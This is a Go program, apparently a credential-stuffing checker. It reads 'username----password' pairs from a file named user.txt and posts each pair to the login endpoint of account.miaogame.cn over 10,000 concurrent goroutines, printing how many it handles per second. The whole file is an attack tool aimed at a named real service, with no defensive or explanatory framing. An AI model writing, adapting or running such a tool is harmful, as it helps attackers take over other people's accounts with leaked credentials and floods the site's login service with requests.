package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"sync/atomic"
	"time"
)

var count int64 = 0

type User struct {
	user_name	string
	pwd			string
}

func httpPost(url string, data []byte) (resp_data []byte, err error) {
	resp, err := http.Post(url,
		"application/x-www-form-urlencoded",
		bytes.NewReader(data))
	if err != nil {
		return nil, err
	}

	defer resp.Body.Close()
	resp_data, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return resp_data, nil
}

var checkQuque = make(chan *User)

func check(user *User) {
	_, err := httpPost("https://account.miaogame.cn/login/loginIn", []byte("loginName=" +
		user.user_name +
		"&loginPassword=" +
		user.pwd +
		"&redirecturl=https%3A%2F%2Faccount.miaogame.cn%2Flogin"))
	if (err == nil) {
		atomic.AddInt64(&count, 1)
		//fmt.Println(string(data), err)
	}
}

func check_thread(){
	for {
		cd, ok := <-checkQuque
		if !ok {
			return
		}

		check(cd)
	}
}

func conut_thread(){
	now := time.Now().Unix()
	for {
		time.Sleep(time.Second)
		fmt.Println("每秒处理数量", count / (time.Now().Unix() - now))
	}
}

func main(){
	defer fmt.Scanln()
	go conut_thread()
	for i := 0;i < 10000;i++ {
		go check_thread()
	}
	f, err := os.Open("user.txt")
	if err != nil {
		fmt.Println("read file fail", err)
		return
	}

	buf := bufio.NewReader(f)

	for {
		line, err := buf.ReadString('\n')
		line = strings.TrimSpace(line)
		data := strings.Split(line, "----")

		if len(data) == 2{
			checkQuque <- &User{
				user_name: data[0],
				pwd:       data[1],
			}
		}

		if err != nil {
			if err == io.EOF {
				return
			}
			return
		}
	}
	return
}
